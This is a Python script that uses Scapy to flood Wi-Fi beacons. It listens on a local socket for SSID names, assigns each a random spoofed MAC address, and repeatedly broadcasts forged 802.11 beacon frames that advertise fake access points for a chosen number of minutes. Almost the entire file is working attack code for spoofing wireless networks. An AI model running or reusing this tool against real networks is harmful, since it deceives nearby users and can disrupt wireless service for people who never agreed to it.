from scapy.all import *
import sys
import re
from socket import *
import time
import threading
import random

conf.verb=0

MAC_LIST = []
HOST = '127.0.0.1'
PORT = 1235

def server_socket():
    server_sock = socket(AF_INET, SOCK_STREAM)
    server_sock.bind((HOST, PORT))
    server_sock.listen()
    client_sock, addr = server_sock.accept()

    print(f"[*] {addr} Connected")
    try:
        while True:
            print("[*] Waiting for SSID")
            ssid = client_sock.recv(1024)
            while True:
                mac = random.randrange(100000000000,100000000000000000)
                if mac in MAC_LIST:
                    continue
                MAC_LIST.append(mac)
                break

            start = time.time()
            print(f"[+] SSID RECEIVED: {ssid}, MAC ADDRESS: {mac}, START TIME: {start}")
            
            t = threading.Thread(target=beacon_flood,args=(dev, ssid, mac, start, given_time))
            t.start()
    except Exception as e:
        print(f"Error Detected\n{e}")
        exit(-1)

def hex_to_mac(hex_val):
    v = hex_val
    s = '{0:016x}'.format(v)
    s = ':'.join(re.findall(r'\w\w', s))
    return s

def beacon_flood(dev, ssid, mac, start, given_time):
    addr = hex_to_mac(mac)
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=addr, addr3=addr)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))
    frame = RadioTap()/dot11/beacon/essid

    while True:
        if time.time() - start > float(given_time)*60:
            print(f"[!]SSID: {ssid} FINISHED")
            break
        time.sleep(1)
        sendp(frame, iface=dev, count = 4)

if __name__ == '__main__':
    dev = sys.argv[1]
    given_time = sys.argv[2]
    t = threading.Thread(target=server_socket)
    t.start()